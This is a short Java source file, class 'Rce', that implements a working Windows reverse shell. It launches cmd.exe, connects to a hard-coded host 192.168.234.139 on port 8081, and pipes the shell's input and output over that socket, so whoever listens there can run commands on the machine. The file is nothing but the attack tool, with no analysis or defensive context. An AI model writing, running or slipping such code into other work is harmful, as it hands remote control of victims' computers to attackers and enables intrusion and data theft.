import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Rce {

	public static void main(String[] args) {
		String host = "192.168.234.139";
		int port = 8081;
		String cmd = "cmd.exe";
		Process p;
		try {
			p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
			Socket s = new Socket(host, port);
			InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
			OutputStream po = p.getOutputStream(), so = s.getOutputStream();
			while (!s.isClosed()) {
				while (pi.available() > 0)
					so.write(pi.read());
				while (pe.available() > 0)
					so.write(pe.read());
				while (si.available() > 0)
					po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				} catch (Exception e) {
					// TODO Auto-generated catch block
					
				}
			}
			p.destroy();
			s.close();
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}
}
